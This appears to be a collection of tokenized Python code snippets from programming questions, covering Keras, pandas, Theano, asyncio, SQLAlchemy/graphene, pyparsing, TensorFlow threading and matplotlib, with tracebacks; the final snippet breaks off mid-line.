"class mul ( layers.Layer ) : def __init__ ( self , **kwargs ) : super ( ) .__init__ ( **kwargs ) # I 've added pass because this is the simplest form I can come up with . passdef call ( self , inputs ) : # magic happens here and multiplications occur return ( Z )"
"class Analysis ( mybaseclass ) : def __init__ ( self , year , cycle ) : ... . def calculation ( self , subject ) : print subject def comparison ( subject , **kwargs ) : self.calculation ( subject ) grade_comparison = functools.partial ( comparison , infoList1 = [ ' A ' , ' B ' ] ) self.grade_comparison = functools.partial ( comparison , self , infoList1 = [ ' A ' , ' B ' ] ) def comparison ( self , subject , **kwargs ) : self.calculation ( subject )"
"reactor.listenUDP ( port , handler ) reactor.listenUDP ( port+1 , handler ) File `` ./rspServer.py '' , line 838 , in mainLoop reactor.listenUDP ( self.args.port+1 , udpHandler ) File `` /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/twisted/internet/posixbase.py '' , line 347 , in listenUDP p.startListening ( ) File `` /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/twisted/internet/udp.py '' , line 86 , in startListening self._connectToProtocol ( ) File `` /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/twisted/internet/udp.py '' , line 106 , in _connectToProtocol self.protocol.makeConnection ( self ) File `` /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/twisted/internet/protocol.py '' , line 665 , in makeConnection assert self.transport == NoneAssertionError"
"> > > ' { x-y } '.format ( ** { ' x-y ' : 3 } ) # The keyword argument is *not* a valid Python identifier ' 3 ' > > > ' { x-y } '.format ( x-y=3 ) File `` < ipython-input-12-722afdf7cfa3 > '' , line 1SyntaxError : keyword ca n't be an expression"
"import numpy as npfrom sklearn.decomposition import PCApca = PCA ( n_components=1 ) samples = np.array ( [ [ 0,0,0 ] , [ 1,1,1 ] , [ 2,2,2 ] , [ 1,1,1 ] , [ 0,0,0 ] ] ) pc1 = pca.fit_transform ( samples ) print ( pc1 ) [ [ -1.38564065 ] [ 0.34641016 ] [ 2.07846097 ] [ 0.34641016 ] [ -1.38564065 ] ]"
"from pdfminer.pdfinterp import PDFResourceManager , PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPagefrom cStringIO import StringIOdef convert_pdf_to_txt ( path ) : rsrcmgr = PDFResourceManager ( ) retstr = StringIO ( ) codec = 'utf-8 ' laparams = LAParams ( ) device = TextConverter ( rsrcmgr , retstr , codec=codec , laparams=laparams ) with open ( path , 'rb ' ) as fp : interpreter = PDFPageInterpreter ( rsrcmgr , device ) password = `` '' caching = True pagenos = set ( ) for page in PDFPage.get_pages ( fp , pagenos , password=password , caching=caching , check_extractable=True ) : interpreter.process_page ( page ) text = retstr.getvalue ( ) device.close ( ) retstr.close ( ) return textprint convert_pdf_to_txt ( `` S24A276P001.pdf '' )"
"[ { `` first '' : `` bob '' , `` address '' : { `` street '' : 13301 , `` zip '' : 1920 } } , { `` first '' : `` sarah '' , `` address '' : { `` street '' : 13301 , `` zip '' : 1920 } } , { `` first '' : `` tom ''"
"foo = array ( [ 3 , 1 , 4 , 0 , 1 , 0 ] ) foo.argsort ( ) [ : :-1 ] [ :3 ] array ( [ 2 , 0 , 4 ] )"
"import asynciofrom typing import Listdef some_callback ( result ) : print ( result ) async def b ( ) - > List [ int ] : return [ 1 , 2 , 3 ] async def a ( ) - > None : search = asyncio.ensure_future ( b ( ) ) search.add_done_callback ( some_callback ) await searchloop = asyncio.get_event_loop ( ) loop.run_until_complete ( a ( ) ) loop.close ( ) < Task finished coro= < b ( ) done , defined at ____.py:7 > result= [ 1 , 2 , 3 ] >"
if self.state == 'new ' : do some logicif self.state == 'archive ' : do some logic
n = 69if n == True : print 'potato ' wim @ SDFA100461C : /tmp $ pep8 spam.py spam.py:3:6 : E712 comparison to True should be 'if cond is True : ' or 'if cond : '
"import theano.tensor as Timport theano , numpyshared_vector = theano.shared ( numpy.zeros ( ( 10 , ) ) ) print ( shared_vector.type ) # TensorType ( float64 , vector ) print ( shared_vector.broadcastable ) # ( False , ) shared_vector = theano.shared ( numpy.zeros ( ( 1,10 , ) ) ) print ( shared_vector.type ) # TensorType ( float64 , matrix ) print ( shared_vector.broadcastable ) # ( False , False ) row = T.row ( 'row ' ) mat=T.matrix ( 'matrix ' ) f=theano.function ( [ ] , mat + row , givens= { mat : numpy.zeros ( ( 20,10 ) , dtype=numpy.float32 ) , row : numpy.zeros ( ( 10 , ) , dtype=numpy.float32 ) } , on_unused_input='ignore ' ) TypeError : Can not convert Type TensorType ( float32 , vector ) ( of Variable < TensorType ( float32 , vector ) > ) into Type TensorType ( float32 , row ) . You can try to manually convert < TensorType ( float32 , vector ) > into a TensorType ( float32 , row ) . row = T.matrix ( 'row ' ) mat=T.matrix ( 'matrix ' ) f=theano.function ( [ ] , mat + row , givens= { mat : numpy.zeros ( ( 20,10 ) , dtype=numpy.float32 ) , row : numpy.zeros ( ( 1,10 , ) , dtype=numpy.float32 ) } , on_unused_input='ignore ' ) f ( ) ValueError : Input dimension mis-match . ( input [ 0 ] .shape [ 0 ] = 20 , input [ 1 ] .shape [ 0 ] = 1 ) Apply node that caused the error : Elemwise { add , no_inplace } ( < TensorType ( float32 , matrix ) > , < TensorType ( float32 , matrix ) > ) Inputs types : [ TensorType ( float32 , matrix ) , TensorType ( float32 , matrix ) ] Inputs shapes : [ ( 20 , 10 ) , ( 1 , 10 ) ] Inputs strides : [ ( 40 , 4 ) , ( 40 , 4 ) ] Inputs values : [ 'not shown ' , 'not shown ' ] Backtrace when the node is created : File `` < ipython-input-55-0f03bee478ec > '' , line 5 , in < module > mat + row , HINT : Use the Theano flag 'exception_verbosity=high ' for a debugprint and storage map footprint of this apply node ."
"df = pd.DataFrame ( [ ' A+ ' , ' A ' , ' A- ' , ' B+ ' , ' B ' , ' B- ' , ' C+ ' , ' C ' , ' C- ' , 'D+ ' , 'D ' ] , index= [ 'excellent ' , 'excellent ' , 'excellent ' , 'good ' , 'good ' , 'good ' , 'ok ' , 'ok ' , 'ok ' , 'poor ' , 'poor ' ] ) df.rename ( columns= { 0 : 'Grades ' } , inplace=True ) df df = df [ 'Grades ' ] .astype ( 'category ' , categories= [ 'D ' , 'D+ ' , ' C- ' , ' C ' , ' C+ ' , ' B- ' , ' B ' , ' B+ ' , ' A- ' , ' A ' , ' A+ ' ] , ordered=True )"
"rlist , _ , _ = select.select ( sockets , [ ] , [ ] )"
"setup.pysrc/ disttest/ __init__.py core.pytests/ disttest/ __init__.py testcore.py from distutils.core import setupimport setuptoolssetup ( name='disttest ' , version= ' 0.1 ' , package_dir= { `` : 'src ' } , packages=setuptools.find_packages ( 'src ' ) , test_suite='nose.collector ' , tests_require= [ 'Nose ' ] , )"
"from google.appengine.api import imagesprint images.get_serving_url ( page , size=100 ) > > http : //0.0.0.0:8080/_ah/img/AMIfv96IySWiIWF-4FRipavsn9xXnkk-EhmNOU0qWZ4y0ORIXj0Ct85C9eXMBdv3JVooWPIm6-2D3U9ffuTtpJEkWh13ZzmmaNKSiu5QMsnk0exNWj7g1OWbpNxcsjtmv52wz94QFQ6xCNz-atycTqfkdDHbX-LWmMqlsrVEs86S4wsAKSNOZZE=s100"
"> > > df.head ( 2 ) state enrollees utilizing enrol_age65 util_age65 year1 Alabama 637247 635431 473376 474334 20132 Alaska 30486 28514 21721 20457 2013 > > > df.tail ( 2 ) state enrollees utilizing enrol_age65 util_age65 year214 Puerto Rico 581861 579514 453181 450150 2016215 U.S . Territories 24329 16979 22608 15921 2016 enrollees utilizingyear state 2013 California 3933310 3823455 New York 3133980 3002948 Florida 2984799 2847574 ... 2016 California 4516216 4365896 Florida 4186823 3984756 New York 4009829 3874682 enrollees utilizingyear state 2013 Alabama 637247 635431 Alaska 30486 28514 Arizona 707683 683273 df.groupby ( [ 'year ' , 'state ' ] ) [ 'enrollees ' , 'utilizing ' ] \ .apply ( lambda x : np.sum ( x ) ) .nlargest ( 3 , 'enrollees ' ) enrollees utilizingyear state 2016 California 4516216 43658962015 California 4324304 41917042014 California 4133532 4011208"
"cmd = [ executable_path , ' < ' , 'tmp/input.txt ' , ' > ' , 'tmp/output.txt ' ] p = subprocess.Popen ( cmd ) p.communicate ( ) cmd = [ executable_path , ' '.join ( [ ' < ' , 'tmp/input.txt ' , ' > ' , 'tmp/output.txt ' ] ) ] p = subprocess.Popen ( ' '.join ( cmd ) )"
sentence = `` Meloxicam tablet is indicated for relief of the signs and symptoms of osteoarthritis and rheumatoid arthritis '' extract ( sentence ) > > 'relief of the signs and symptoms of osteoarthritis and rheumatoid arthritis '
"1. hyper ( Perplexity score here ) 2. sad ( Perplexity score here ) 3. scared ( Perplexity score here ) import torch , torch.nn as nnfrom torch.autograd import Variabletext = [ 'BOS ' , 'How ' , 'are ' , 'you ' , 'EOS ' ] seq_len = len ( text ) batch_size = 1embedding_size = 1hidden_size = 1output_size = 1random_input = Variable ( torch.FloatTensor ( seq_len , batch_size , embedding_size ) .normal_ ( ) , requires_grad=False ) bi_rnn = torch.nn.RNN ( input_size=embedding_size , hidden_size=hidden_size , num_layers=1 , batch_first=False , bidirectional=True ) bi_output , bi_hidden = bi_rnn ( random_input ) # staggerforward_output , backward_output = bi_output [ : -2 , : , : hidden_size ] , bi_output [ 2 : , : , hidden_size : ] staggered_output = torch.cat ( ( forward_output , backward_output ) , dim=-1 ) linear = nn.Linear ( hidden_size * 2 , output_size ) # only predict on wordslabels = random_input [ 1 : -1 ] # for language models , use cross-entropy : ) loss = nn.MSELoss ( ) output = loss ( linear ( staggered_output ) , labels )"
"# ! /usr/bin/pythonfrom jsonschema import Validatorchecker = Validator ( ) schema = { `` type '' : `` object '' , `` properties '' : { `` source '' : { `` type '' : `` object '' , `` properties '' : { `` name '' : { `` type '' : `` string '' } } } } } data = { `` source '' : { `` name '' : '' blah '' , `` bad_key '' : '' This data is not allowed according to the schema . '' } } checker.validate ( data , schema )"
"# blog/models.pyfrom sqlalchemy import *from sqlalchemy.orm import ( scoped_session , sessionmaker , relationship , backref ) from sqlalchemy.ext.declarative import declarative_base engine = create_engine ( 'sqlite : ///database.sqlite3 ' , convert_unicode=True ) db_session = scoped_session ( sessionmaker ( autocommit=False , autoflush=False , bind=engine ) ) Base = declarative_base ( ) # We will need this for queryingBase.query = db_session.query_property ( ) class User ( Base ) : __tablename__ = 'user ' id = Column ( Integer , primary_key= True ) name = Column ( String ) email = Column ( String ) posts = relationship ( `` Post '' , backref= '' user '' ) class Post ( Base ) : __tablename__ = 'post ' id = Column ( Integer , primary_key= True ) title = Column ( String ) text = Column ( Text ) user_id = Column ( Integer , ForeignKey ( 'user.id ' ) ) import graphenefrom graphene import relayfrom graphene_sqlalchemy import SQLAlchemyObjectType , SQLAlchemyConnectionFieldfrom models import db_session , User as UserModel , Post as PostModelfrom sqlalchemy import *class User ( SQLAlchemyObjectType ) : class Meta : model = UserModel interfaces = ( relay.Node , ) class Post ( SQLAlchemyObjectType ) : class Meta : model = PostModel interfaces = ( relay.Node , ) class CreateUser ( graphene.Mutation ) : class Input : name = graphene.String ( ) ok = graphene.Boolean ( ) user = graphene.Field ( User ) @ classmethod def mutate ( cls , instance , args , context , info ) : new_user = User ( name=args.get ( 'name ' ) ) db_session.add ( new_user ) db_session.commit ( ) ok = True return CreateUser ( user=new_user , ok=ok ) class Query ( graphene.ObjectType ) : node = relay.Node.Field ( ) user = relay.Node.Field ( User ) allUsers = SQLAlchemyConnectionField ( User ) class MyMutations ( graphene.ObjectType ) : create_user = CreateUser.Field ( ) schema = graphene.Schema ( query=Query , mutation = MyMutations , types = [ User , Post ] ) -- Query -- mutation Test { createUser ( name : '' tess '' ) { ok user { name } } } -- Result -- { `` errors '' : [ { `` message '' : `` Class 'schema2.User ' is not mapped '' , `` locations '' : [ { `` line '' : 2 , `` column '' : 3 } ] } ] , `` data '' : { `` createUser '' : null } }"
A=c*x+d
"`` `` '' The classic MapReduce job : count the frequency of words . `` `` '' from mrjob.job import MRJobimport reimport loggingimport logging.handlersimport sysWORD_RE = re.compile ( r '' [ \w ' ] + '' ) class MRWordFreqCount ( MRJob ) : def mapper_init ( self ) : self.logger = logging.getLogger ( ) self.logger.setLevel ( logging.INFO ) self.logger.addHandler ( logging.FileHandler ( `` /tmp/mr.log '' ) ) self.logger.addHandler ( logging.StreamHandler ( ) ) self.logger.addHandler ( logging.StreamHandler ( sys.stdout ) ) self.logger.addHandler ( logging.handlers.SysLogHandler ( ) ) def mapper ( self , _ , line ) : self.logger.info ( `` Test logging : % s '' , line ) sys.stderr.write ( `` Test stderr : % s\n '' % line ) print `` Test print : % s '' % line for word in WORD_RE.findall ( line ) : yield ( word.lower ( ) , 1 ) def combiner ( self , word , counts ) : yield ( word , sum ( counts ) ) def reducer ( self , word , counts ) : yield ( word , sum ( counts ) ) if __name__ == '__main__ ' : MRWordFreqCount.run ( )"
> > > def foo ( **kwargs ) : ... pass ... > > > foo ( ** { 0:0 } ) TypeError : foo ( ) keywords must be strings > > > from types import SimpleNamespace > > > SimpleNamespace ( ** { 0:0 } ) namespace ( )
"< ? xml version= '' 1.0 '' encoding= '' ISO-8859-1 '' ? > < ! DOCTYPE foobar PUBLIC `` foobar : dtd '' `` foobar.dtd '' [ < ! ENTITY foo SYSTEM `` foo.xml '' > < ! ENTITY bar SYSTEM `` bar.xml '' > ] > < foo > < params > & foo ; < /params > < bar > & bar ; < /bar > < /foo > autocmd BufReadPost , FileReadPost *.xml silent % ! xmllint -- noent - 2 > /dev/null"
"u = [ 1,2,3,4,5,6,7,8,9,10 ] plt.errorbar ( range ( 10 ) , u , yerr=1 ) plt.show ( ) ValueError : too many values to unpack"
"move item1 before item2move item3 after item2 [ 1,3,2,7,6,0,4 ] move 2 before 3move 7 after 6move 0 before 1move 4 before 6"
"numpy.dot ( a , b.T )"
texture_unit optionalName { texture required_val prop_name1 prop_val1 prop_name2 prop_val1 } pass optionalName { prop_name1 prop_val1 prop_name2 prop_val1 texture_unit optionalName { // edit 2 : showing use of ' . ' character in value texture required_val.file.name optional_val // edit 1 : forgot this line in initial post . // edit 2 : showing potentially multiple values prop_name3 prop_val1 prop_val2 prop_name4 prop_val1 } } prop_ = pp.Group ( pp.Word ( pp.alphanums+ ' _ ' ) +pp.Group ( pp.OneOrMore ( pp.Word ( pp.alphanums+ ' _'+ ' . ' ) ) ) ) texture_props_ = pp.Group ( pp.Literal ( 'texture ' ) + pp.Word ( pp.alphanums+ ' _'+ ' . ' ) ) + pp.ZeroOrMore ( prop_ ) texture_ = pp.Forward ( ) texture_ < < pp.Literal ( 'texture_unit ' ) .suppress ( ) + pp.Optional ( pp.Word ( pp.alphanums+ ' _ ' ) ) .suppress ( ) + pp.Literal ( ' { ' ) .suppress ( ) + texture_props_ + pp.Literal ( ' } ' ) .suppress ( ) pass_props_ = pp.ZeroOrMore ( prop_ ) pass_ = pp.Forward ( ) pass_ < < pp.Literal ( 'pass ' ) .suppress ( ) + pp.Optional ( pp.Word ( pp.alphanums+ ' _'+ ' . ' ) ) .suppress ( ) + pp.Literal ( ' { ' ) .suppress ( ) + pass_props_ + pp.ZeroOrMore ( texture_ ) + pp.Literal ( ' } ' ) .suppress ( )
( ( words:0.23 ) 75:0.55 ( morewords:0.1 ) 2:0.55 ) ; ( ( words:0.23 ) 0.75:0.55 ( morewords:0.1 ) 0.02:0.55 ) ;
"error : '' Toto '' has no attribute `` age '' class Toto : def __init__ ( self , name : str ) - > None : self.name = name for attr in [ 'age ' , 'height ' ] : setattr ( self , attr , 0 ) toto = Toto ( `` Toto '' ) toto.age = 10 # `` Toto '' has no attribute `` age '' : ("
"np.reshape ( v.T , reshape_tuple ) np.reshape ( v.ravel ( order= ' F ' ) , reshape_tuple )"
"logging.basicConfig ( filename= '' /tmp/test.log '' , format= '' % ( asctime ) s % ( levelname ) s % ( message ) s '' , filemode= '' a '' , level=logging.INFO ) logging.info ( `` xxxxxxx '' )"
"If 3 Disp 4 Disp 6End [ 'PROGRAM ' , [ 'BLOCK ' , [ 'IF ' , [ 'CONDITION ' , 3 ] , [ 'BLOCK ' , [ 'DISP ' , 4 ] , [ 'DISP ' , 6 ] ] ] ] ]"
"listOfLists = [ [ ' a ' , ' b ' , ' c ' , 'd ' ] , [ ' a ' , ' b ' ] , [ ' a ' , ' c ' ] , [ ' c ' , ' c ' , ' c ' , ' c ' ] ] { ' a':3 , ' b':2 , ' c':3 , 'd':1 } line_count_tags = [ ] for lists in lists_of_lists : s = set ( ) for element in lists : s.add ( t ) lines_count_tags.append ( list ( s ) ) count = Counter ( [ count for counts in lines_count_tags for count in counts ] ) { ' a':3 , ' c':3 , ' b':2 , 'd':1 }"
"model = keras.Sequential ( [ keras.layers.Dense ( units=100 , activation='relu ' ) , keras.layers.Dense ( units=50 , activation='relu ' ) , keras.layers.Dense ( units=5 , activation='softmax ' ) ] ) model.compile ( optimizer=optimizer , loss=tf.losses.CategoricalCrossentropy ( from_logits=True ) , metrics= [ 'accuracy ' ] ) history = model.fit ( training_data.repeat ( ) , epochs=100 , steps_per_epoch= ( X_train.shape [ 0 ] //1024 ) , validation_data=test_data.repeat ( ) , validation_steps=2 ) model = keras.Sequential ( [ tfp.layers.DenseFlipout ( units=100 , activation='relu ' ) , tfp.layers.DenseFlipout ( units=10 , activation='relu ' ) , tfp.layers.DenseFlipout ( units=5 , activation='softmax ' ) ] ) model.compile ( optimizer=optimizer , loss=tf.losses.CategoricalCrossentropy ( from_logits=True ) , metrics= [ 'accuracy ' ] ) history = model.fit ( training_data.repeat ( ) , epochs=100 , steps_per_epoch= ( X_train.shape [ 0 ] //1024 ) , validation_data=test_data.repeat ( ) , validation_steps=2 ) ValueError : Variable < tf.Variable 'sequential_11/dense_flipout_15/kernel_posterior_loc:0 ' shape= ( 175 , 100 ) dtype=float32 > has ` None ` for gradient . Please make sure that all of your ops have a gradient defined ( i.e . are differentiable ) . Common ops without gradient : K.argmax , K.round , K.eval ."
"def decorate ( f ) : print 'decorator thinks function is ' , f return fclass Test ( object ) : @ decorate def test_call ( self ) : passif __name__ == '__main__ ' : Test ( ) .test_call ( ) print 'main thinks function is ' , Test ( ) .test_call decorator thinks function is < function test_call at 0x10041cd70 > main thinks function is < bound method Test.test_call of < __main__.Test object at 0x100425a90 > > ismethod = Falsefor item in inspect.getmro ( type ( args [ 0 ] ) ) : for x in inspect.getmembers ( item ) : if 'im_func ' in dir ( x [ 1 ] ) : ismethod = x [ 1 ] .im_func == newf if ismethod : break else : continue break"
"print ( X_train_OS.shape ) print ( y_train_OS.shape ) ( 22354 , 11 ) ( 22354 , ) from keras.models import Sequentialfrom keras.layers import Densefrom keras.wrappers.scikit_learn import KerasClassifierfrom keras.utils import to_categorical # OHEX_train_predictors = df_train_OS.drop ( `` label '' , axis=1 ) X_train_predictors = X_train_predictors.valuesy_train_target = to_categorical ( df_train_OS [ `` label '' ] ) y_test_predictors = test_set.drop ( `` label '' , axis=1 ) y_test_predictors = y_test_predictors.valuesy_test_target = to_categorical ( test_set [ `` label '' ] ) print ( X_train_predictors.shape ) print ( y_train_target.shape ) ( 22354 , 11 ) ( 22354 , 2 ) def keras_classifier_wrapper ( ) : clf = Sequential ( ) clf.add ( Dense ( 32 , input_dim=11 , activation='relu ' ) ) clf.add ( Dense ( 2 , activation='softmax ' ) ) clf.compile ( loss='categorical_crossentropy ' , optimizer='adam ' , metrics= [ `` accuracy '' ] ) return clfTOKENS_ALPHANUMERIC_HYPHEN = `` [ A-Za-z0-9\- ] + ( ? =\\s+ ) '' boolTransformer = Pipeline ( steps= [ ( 'bool ' , PandasDataFrameSelector ( BOOL_FEATURES ) ) ] ) catTransformer = Pipeline ( steps= [ ( 'cat_imputer ' , SimpleImputer ( strategy='constant ' , fill_value='missing ' ) ) , ( 'cat_ohe ' , OneHotEncoder ( handle_unknown='ignore ' ) ) ] ) numTransformer = Pipeline ( steps= [ ( 'num_imputer ' , SimpleImputer ( strategy='constant ' , fill_value=0 ) ) , ( 'num_scaler ' , StandardScaler ( ) ) ] ) textTransformer_0 = Pipeline ( steps= [ ( 'text_bow ' , CountVectorizer ( lowercase=True , \ token_pattern=TOKENS_ALPHANUMERIC_HYPHEN , \ stop_words=stopwords ) ) ] ) textTransformer_1 = Pipeline ( steps= [ ( 'text_bow ' , CountVectorizer ( lowercase=True , \ token_pattern=TOKENS_ALPHANUMERIC_HYPHEN , \ stop_words=stopwords ) ) ] ) FE = ColumnTransformer ( transformers= [ ( 'bool ' , boolTransformer , BOOL_FEATURES ) , ( 'cat ' , catTransformer , CAT_FEATURES ) , ( 'num ' , numTransformer , NUM_FEATURES ) , ( 'text0 ' , textTransformer_0 , TEXT_FEATURES [ 0 ] ) , ( 'text1 ' , textTransformer_1 , TEXT_FEATURES [ 1 ] ) ] ) clf = KerasClassifier ( keras_classifier_wrapper , epochs=100 , batch_size=500 , verbose=0 ) PL = Pipeline ( steps= [ ( 'feature_engineer ' , FE ) , ( 'keras_clf ' , clf ) ] ) PL.fit ( X_train_predictors , y_train_target ) # PL.fit ( X_train_OS , y_train_OS )"
"from math import *UPRIGHT = 0DOWNRIGHT = 1DOWNLEFT = 2UPLEFT = 3UP = 4RIGHT = 5LEFT = 6DOWN = 7def roundDistance ( a ) : b = round ( a * 100000 ) return b / 100000.0 # only used for presenting and does n't affect percisiondef double ( a ) : b = round ( a * 100 ) if b / 100.0 == b : return int ( b ) return b / 100.0def roundAngle ( a ) : b = round ( a * 1000 ) return b / 1000.0def isValid ( point ) : x , y = point if x < 0 or x > width or y < 0 or y > height : return False return Truedef isCorner ( point ) : if point in corners : return True return False # Find the angle direction in relation to the origin ( observer ) pointdef getDirection ( a ) : angle = roundAngle ( a ) if angle == 0 : return RIGHT if angle > 0 and angle < pi / 2 : return UPRIGHT if angle == pi / 2 : return UP if angle > pi / 2 and angle < pi : return UPLEFT if angle == pi : return LEFT if angle > pi and angle < 3 * pi / 2 : return DOWNLEFT if angle == 3 * pi / 2 : return DOWN return DOWNRIGHT # Measure reflected vector angledef getReflectionAngle ( tail , head ) : v1 = ( head [ 0 ] - tail [ 0 ] , head [ 1 ] - tail [ 1 ] ) vx , vy = v1 n = ( 0 , 0 ) # Determin the normal vector from the tail 's position on the borders if head [ 0 ] == 0 : n = ( 1 , 0 ) if head [ 0 ] == width : n = ( -1 , 0 ) if head [ 1 ] == 0 : n = ( 0 , 1 ) if head [ 1 ] == height : n = ( 0 , -1 ) nx , ny = n # Calculate the reflection vector using the formula : # r = v - 2 ( v.n ) n r = ( vx * ( 1 - 2 * nx * nx ) , vy * ( 1 - 2 * ny * ny ) ) # calculating the angle of the reflection vector using it 's a and b values # if b ( adjacent ) is zero that means the angle is either pi/2 or -pi/2 if r [ 0 ] == 0 : return pi / 2 if r [ 1 ] > = 0 else 3 * pi / 2 return ( atan2 ( r [ 1 ] , r [ 0 ] ) + ( 2 * pi ) ) % ( 2 * pi ) # Find the intersection point between the vector and bordersdef getIntersection ( tail , angle ) : if angle < 0 : print `` Negative angle : % f '' % angle direction = getDirection ( angle ) if direction in [ UP , RIGHT , LEFT , DOWN ] : return None borderX , borderY = corners [ direction ] x0 , y0 = tail opp = borderY - tail [ 1 ] adj = borderX - tail [ 0 ] p1 = ( x0 + opp / tan ( angle ) , borderY ) p2 = ( borderX , y0 + adj * tan ( angle ) ) if isValid ( p1 ) and isValid ( p2 ) : print `` Both intersections are valid : `` , p1 , p2 if isValid ( p1 ) and p1 ! = tail : return p1 if isValid ( p2 ) and p2 ! = tail : return p2 return None # Check if the vector pass through the target pointdef isHit ( tail , head ) : d = calcDistance ( tail , head ) d1 = calcDistance ( target , head ) d2 = calcDistance ( target , tail ) return roundDistance ( d ) == roundDistance ( d1 + d2 ) # Measure distance between two pointsdef calcDistance ( p1 , p2 ) : x1 , y1 = p1 x2 , y2 = p2 return ( ( y2 - y1 ) **2 + ( x2 - x1 ) **2 ) **0.5 # Trace the vector path and reflections and check if it can hit the targetdef rayTrace ( point , angle ) : path = [ ] length = 0 tail = point path.append ( [ tail , round ( degrees ( angle ) ) ] ) while length < maxLength : head = getIntersection ( tail , angle ) if head is None : # print `` Direct reflection at angle ( % d ) '' % angle return None length += calcDistance ( tail , head ) if isHit ( tail , head ) and length < = maxLength : path.append ( [ target ] ) return [ path , double ( length ) ] if isCorner ( head ) : # print `` Corner reflection at ( % d , % d ) '' % ( head [ 0 ] , head [ 1 ] ) return None p = ( double ( head [ 0 ] ) , double ( head [ 1 ] ) ) path.append ( [ p , double ( degrees ( angle ) ) ] ) angle = getReflectionAngle ( tail , head ) tail = head return Nonedef solve ( w , h , po , pt , m ) : # Initialize global variables global width , height , origin , target , maxLength , corners , borders width = w height = h origin = po target = pt maxLength = m corners = [ ( w , h ) , ( w , 0 ) , ( 0 , 0 ) , ( 0 , h ) ] angle = 0 solutions = [ ] # Loop in anti-clockwise direction for one cycle while angle < 2 * pi : angle += 0.001 path = rayTrace ( origin , angle ) if path is not None : # extract only the points coordinates route = [ x [ 0 ] for x in path [ 0 ] ] if route not in solutions : solutions.append ( route ) print path # Anser is 7solve ( 3 , 2 , ( 1 , 1 ) , ( 2 , 1 ) , 4 ) # Answer is 9 # solve ( 300 , 275 , ( 150 , 150 ) , ( 185 , 100 ) , 500 )"
"import multiprocessing as mppool = mp.Pool ( ) def d ( x ) : return x / 2.0def f ( x ) : w = pool.map ( d , x ) return wdef g ( ) : v = pool.map ( f , [ [ 1 , 2 ] , [ 3 , 4 ] ] ) print ( v )"
"`` It 's the show your only friend and pastor have been talking about ! < i > Wonder Showzen < /i > is a hilarious glimpse into the black heart of childhood innocence ! Get ready as the complete first season of MTV2 's < i > Wonder Showzen < /i > tackles valuable life lessons like birth , nature , diversity , and history & # 8211 ; all inside the prison of your mind ! Where else can you ... '' def remove_tags ( text ) : return TAG_RE.sub ( `` , text )"
x = 1y = 2z = 3r = ( x+y+z+1 ) + ( x+y+z+2 )
"import pandas as pdimport numpy as npdf = pd.DataFrame ( { ' x ' : [ 1,2 ] } ) print ( df ) df_sub = df [ 0:1 ] df_sub.x = -1print ( df_sub._is_view ) # Trueprint ( id ( df ) == id ( df_sub ) ) # Falseprint ( np.shares_memory ( df , df_sub ) ) # True"
"list_a = [ ] list_b = [ ] list_c = [ ] arq_b = open ( 'list_b.txt ' , ' r ' ) for b in arq_b : list_b.append ( b ) arq_a = open ( 'list_a.txt ' , ' r ' ) for a in arq_a : if a not in arq_b : list_c.append ( a ) arq_c = open ( 'list_c.txt ' , ' w ' ) for c in list_c : arq_c.write ( c )"
foo.py +s -b
"from threading import Threadimport tensorflow as tfimport timenum_threads = 8a = [ ] for i in range ( num_threads ) : with tf.device ( '/cpu:0 ' ) : a.append ( tf.get_variable ( name='a_ % d ' % i , shape= [ 5000 , 50 , 5 , 5 , 5 , 5 ] , initializer=tf.truncated_normal_initializer ( ) ) ) b = [ ] for i in range ( num_threads ) : with tf.device ( '/cpu:0 ' ) : b.append ( tf.get_variable ( name='b_ % d ' % i , shape= [ 5000 , 50 , 5 , 5 , 5 , 5 ] , initializer=tf.truncated_normal_initializer ( ) ) ) train_ops = [ ] for i in range ( num_threads ) : with tf.device ( 'gpu : % d ' % i ) : loss = tf.multiply ( a [ i ] , b [ i ] , name='loss_ % d ' % i ) train_ops.append ( tf.train.GradientDescentOptimizer ( 0.01 ) .minimize ( loss ) ) sess = tf.Session ( ) sess.run ( tf.initialize_all_variables ( ) ) def train_function ( train_op ) : for i in range ( 20 ) : sess.run ( train_op ) train_threads = [ ] for train_op in train_ops : train_threads.append ( Thread ( target=train_function , args= ( train_op , ) ) ) start = time.time ( ) for t in train_threads : t.start ( ) for t in train_threads : t.join ( ) end = time.time ( ) print ( 'elapsed time is : ' , end-start )"
"import numpy as npimport pylab as plimport matplotlib as pltimport matplotlib.ticker as tickerimport matplotlib.transformsdef add_scales ( fig , axes , scales , subplot_reduction_factor=0.1 , margin_size=50 ) : nb_scales = len ( scales ) b , l , w , h = zoom_ax.get_position ( ) .bounds _ , ymax = axes.get_ylim ( ) # Saves some space to the right so that we can add our scales fig.subplots_adjust ( right=1- ( subplot_reduction_factor ) *nb_scales ) for ( n , ( vmin , vmax , color , label , alignment ) ) in enumerate ( scales ) : # Adjust wrt . the orignial figure 's scale nax = fig_zoom.add_axes ( ( b , l , w , ( h * alignment ) / ymax ) ) nax.spines [ 'right ' ] .set_position ( ( 'outward ' , -40+n*margin_size ) ) nax.set_ylim ( ( vmin , vmax ) ) # Move ticks and label to the right nax.yaxis.set_label_position ( 'right ' ) nax.yaxis.set_ticks_position ( 'right ' ) # Hides everything except yaxis nax.patch.set_visible ( False ) nax.xaxis.set_visible ( False ) nax.yaxis.set_visible ( True ) nax.spines [ `` top '' ] .set_visible ( False ) nax.spines [ `` bottom '' ] .set_visible ( False ) # Color stuff nax.spines [ 'right ' ] .set_color ( color ) nax.tick_params ( axis= ' y ' , colors=color ) nax.yaxis.set_smart_bounds ( False ) # nax.yaxis.label.set_color ( color ) if label ! = None : nax.set_ylabel ( None ) if __name__ == '__main__ ' : a= ( np.random.normal ( 10,5,100 ) ) a=np.linspace ( 0,100,100 ) c=np.linspace ( 0,80 , 100 ) d=np.linspace ( 0,40,100 ) fig_zoom = plt.pyplot.figure ( ) zoom_ax = fig_zoom.add_subplot ( 1,1,1 ) zoom_ax.plot ( a , c ) zoom_ax.plot ( a , d ) zoom_ax.set_title ( 'Zoom ' ) zoom_ax.set_xlabel ( ' A ' ) zoom_ax.set_ylabel ( ' B ' ) zoom_ax.set_ylim ( ( 0,100 ) ) zoom_ax.grid ( ) add_scales ( fig_zoom , zoom_ax , [ ( 0 , .55 , 'green ' , None,40 ) , ( 0 , .85 , 'blue ' , None,80 ) ] ) fig_zoom.savefig ( open ( 